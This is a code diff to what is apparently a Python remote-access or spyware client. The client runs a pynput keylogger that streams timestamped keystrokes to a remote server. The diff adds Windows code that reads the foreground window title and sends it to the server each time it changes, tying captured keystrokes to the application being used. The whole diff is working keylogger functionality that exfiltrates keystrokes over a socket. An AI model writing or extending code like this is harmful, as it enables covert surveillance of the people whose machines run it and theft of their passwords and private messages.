@@ -448,18 +448,48 @@ _keylog_listener = None
 _keylog_active = False
 
 
+_last_window_title = ""
+
+def get_active_window_title():
+    import platform
+    if platform.system() == "Windows":
+        try:
+            import ctypes
+            hwnd = ctypes.windll.user32.GetForegroundWindow()
+            if not hwnd:
+                return ""
+            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
+            buf = ctypes.create_unicode_buffer(length + 1)
+            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
+            return buf.value
+        except Exception:
+            return ""
+    return ""
+
 def start_keylog_stream():
     """Start background listener that streams [KEYSTROKE] lines live to server."""
-    global _keylog_listener, _keylog_active
+    global _keylog_listener, _keylog_active, _last_window_title
     _keylog_active = True
+    _last_window_title = ""
     from pynput import keyboard
     from datetime import datetime
 
     def on_press(key):
+        global _last_window_title, client
         if not _keylog_active:
             return False
         try:
             ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+            
+            # Check for active window change
+            current_title = get_active_window_title()
+            if current_title and current_title != _last_window_title:
+                _last_window_title = current_title
+                win_line = f"[WINDOW] {ts} {current_title}"
+                with client_lock:
+                    client.send(win_line.encode("utf-8", errors="replace"))
+                    client.send(b"\n")
+            
             try:
                 k = key.char
             except AttributeError:
@@ -474,7 +504,6 @@ def start_keylog_stream():
                     line = f"[KEYSTROKE] {ts} {s}"
                 else:
                     line = f"[KEYSTROKE] {ts} <{s.upper()}>"
-            global client
             with client_lock:
                 client.send(line.encode())
                 client.send(b"\n")
